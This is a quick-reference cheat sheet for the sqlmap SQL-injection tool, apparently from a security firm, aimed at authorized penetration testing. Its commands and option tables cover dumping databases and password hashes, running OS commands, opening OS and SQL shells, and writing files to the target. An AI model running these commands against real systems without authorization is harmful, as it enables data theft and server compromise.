# SQLMap Cheat Sheet for Penetration Testing

This guide is for quick reference during SQL injection testing using **sqlmap**, a powerful automated tool for SQLi discovery and exploitation.

---

## 🔧 Basic Usage

```shell
# Specify a POST request with parameters
sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah'

# Target specific parameter in POST/GET data
sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah' -p param1
```

## 🔐 Authentication & Headers

```shell
# Use cookies for authenticated sessions
sqlmap -u 'http://target.server.com' --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx'

# Drop Set-Cookie headers from responses
sqlmap -u 'http://target.server.com' -r req.txt --drop-set-cookie

# Use a random User-Agent header
sqlmap -u 'http://target.server.com' -r req.txt --random-agent
```

## 🎯 Targeted Requests

```shell
# Read request from Burp Suite file and target 'user' parameter
sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords

# Target specific DBMS (example: Oracle)
sqlmap -u 'http://target.server.com' -r req.txt --dbms=Oracle
```

## 🚀 Advanced Attack Options

```shell
# Increase scan intensity
sqlmap -u 'http://target.server.com' --data='param1=blah' --level=5 --risk=3

# Attempt privilege escalation
sqlmap -r ./req.txt --level=1 --risk=3 --privesc

# Execute an OS command (whoami)
sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami

# Dump all data with 1-second delay between requests
sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1
```

## 🧰 Useful Options

| Option | Description |
|--------|-------------|
| `-r req.txt` | Load raw HTTP request from file (e.g., Burp Suite) |
| `--force-ssl` | Enforce HTTPS usage |
| `--proxy http://127.0.0.1:8080` | Route traffic through a proxy like Burp |
| `--delay=1` | Delay between requests (seconds) |
| `--level=1` | Controls number of tests per parameter (1-5) |
| `--risk=3` | Risk level for tests (1-3) |
| `--dbs` | Enumerate databases |
| `--tables` | List tables in a database |
| `--columns` | List columns in a table |
| `--dump` | Dump table contents |
| `--comments` | Extract DB comments |
| `--hostname` | Show DB server hostname |
| `--all` | Dump everything |
| `--passwords` | Get DB user password hashes |
| `--sql-shell` | Open interactive SQL shell |
| `--os-shell` | Attempt to get OS shell |
| `--file-write` | Upload file to server |
| `--file-dest` | Destination path on target server |
| `--reg-read` | Read Windows registry key |

## 🎯 Exploitation Techniques

Use `--technique` to specify injection types:

| Code | Technique |
|------|-----------|
| B | Boolean-based blind |
| E | Error-based |
| U | Union query-based |
| S | Stacked queries |
| T | Time-based blind |
| Q | Inline queries |

---

> ⚠️ **Disclaimer**: This page is for educational and authorized penetration testing only. Abricto Security assumes no responsibility for misuse.